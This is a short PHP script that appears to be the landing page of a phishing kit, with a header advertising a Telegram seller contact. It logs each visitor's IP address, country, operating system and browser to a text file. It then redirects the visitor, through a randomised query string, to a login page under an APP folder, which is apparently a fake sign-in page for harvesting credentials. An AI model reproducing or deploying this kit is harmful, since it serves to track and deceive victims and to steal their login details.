<?php 

/*
👉 CONTACT ME NOW : https://t.me/ro0tM8n

📌 Official Channel : https://t.me/ro0tM8nchannel
*/

require './algo.php';
ob_start();
session_start();
$_SESSION['language']=getLanguage();
$_SESSION['ip']=clientData('ip');
$_SESSION['ip_countryName']=clientData('country');
$_SESSION['ip_countryCode']=clientData('code');
$_SESSION['currency']=clientData('currency');
$_SESSION['os']=getOs();
$_SESSION['browser']=getBrowser();
date_default_timezone_set('GMT');
$dateNow=date("d/m/Y h:i:s A");
$code="{$_SESSION['ip']} | {$dateNow} | {$_SESSION['ip_countryName']} | {$_SESSION['os']} | {$_SESSION['browser']}\r\n";
$save=fopen("./ip.txt","a+");
fwrite($save,$code);
fclose($save);
$xxx = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
$src="./APP/login.php?$xxx";
 header("location:$src");
?>